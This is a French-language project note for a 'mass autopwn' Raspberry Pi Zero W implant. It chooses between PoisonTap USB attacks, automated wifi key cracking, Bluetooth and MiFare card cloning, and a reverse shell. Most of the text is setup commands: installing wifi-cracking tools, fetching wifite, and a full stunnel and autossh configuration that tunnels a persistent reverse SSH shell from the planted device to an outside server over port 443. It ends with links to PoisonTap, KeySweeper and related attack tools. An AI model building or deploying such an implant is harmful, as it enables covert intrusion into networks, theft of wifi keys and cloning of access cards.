# Mass autopwn

Vecteurs d'attaque:
1 - USB via emulation Ethernet (PoisonTap)
2 - Wifi avec crack auto des cles (wifite custom)
3 - Clonage des equipements Bluethoot
4 - Clone carte MiFare
5 - Reverse Shell

Scenarios :
SI branche a un pc ALORS
  1 - poison tap
  5 - Reverse Shell
SINON
  SI carte wifi secondaire ALORS
  	2 - Wifi avec crack auto des cles
  	5 - Reverse Shell
  SI carte MiFare ALORS
    4 - Clone carte MiFare
  SINON
    3 - clonage equipement Bluethoot



Installation :

Utilisation d'un Raspberry PI Zero W
Systeme : raspbian

Mise a jour :
sudo apt update
sudo apt upgrade

changement du mdp par defaut :
sudo passwd pi

configuration du wifi :
https://www.raspberrypi.org/documentation/configuration/wireless/wireless-cli.md

sudo nano /etc/wpa_supplicant/wpa_supplicant.conf

network={
    ssid="The_ESSID_from_earlier"
    psk="Your_wifi_password"
}

sudo wpa_cli reconfigure



3 - Wifi avec crack auto des cles (wifite custom)
necessite une antaine compatible
Installation des dependence pour hack wifi
sudo apt install aircrack-ng reaver tshark pyrit



Recuperation du script wifite
wget https://raw.githubusercontent.com/derv82/wifite/master/wifite.py



5 - Reverse Shell
encapsulation de la connexion ssh dans un tunnel SSL via stunnel
https://charlesreid1.com/wiki/RaspberryPi/SSH_Stunnel

https://charlesreid1.com/wiki/RaspberryPi/Reverse_SSH_Stunnel

configuration serveur :
sudo apt install stunnel4
cd /etc/stunnel/
openssl genrsa -out key.pem 2048
openssl req -new -x509 -key key.pem -out cert.pem -days 365
cat key.pem cert.pem >> /etc/stunnel/stunnel.pem
chmod 700 /etc/stunnel/stunnel.pem
vim /etc/stunnel/stunnel.conf

output = /var/log/stunnel4/stunnel.log
cert=/etc/stunnel/stunnel.pem
key=/etc/stunnel/stunnel.pem
pid=/var/run/stunnel4/stunnel.pid
[ssh]
accept = 443
connect = 127.0.0.1:22

stunnel4 /etc/stunnel/stunnel.conf


configuration client
sudo apt install stunnel4
cd /etc/stunnel/
scp server_ip:/etc/stunnel/stunnel.pem /etc/stunnel/stunnel.pem
vim /etc/stunnel/stunnel.conf

output 	= /var/log/stunnel4/stunnel.log
cert 	= /etc/stunnel/stunnel.pem
key	= /etc/stunnel/stunnel.pem
pid 	= /var/run/stunnel4/stunnel.pid
client  = yes
[ssh]
accept 	= 2200 
connect = 192.168.0.12:443

stunnel4 /etc/stunnel/stunnel.conf


lancement du reverse shell:
sur le client
autossh -R 2201:localhost:22 -p 2200 chris@localhost
ensuite sur le serveur
autossh -p 2201 pi@localhost

utilisation de autossh pour garder le tunnel alive

Pour ne plus avoir a taper de mdp entre la connexion client -> serveur
sur le client :
ssh-keygen -t dsa
cat ~/.ssh/id_dsa.pub
sur le serveur


POISON TAP
==========

Description :
-------------
https://samy.pl/poisontap/

GIT :
-----
https://github.com/samyk/poisontap



MASS-PWNING
===========

Description :
------------
http://virtualabs.fr/ndh16/ndh16-mass-pwning-bug.pdf
https://www.youtube.com/watch?v=tu6uELaAiJg


GIT :
-----
https://github.com/virtualabs/probeZero
https://github.com/DigitalSecurity/mockle



KEYSWEEPER
==========

Description :
-------------
http://samy.pl/keysweeper/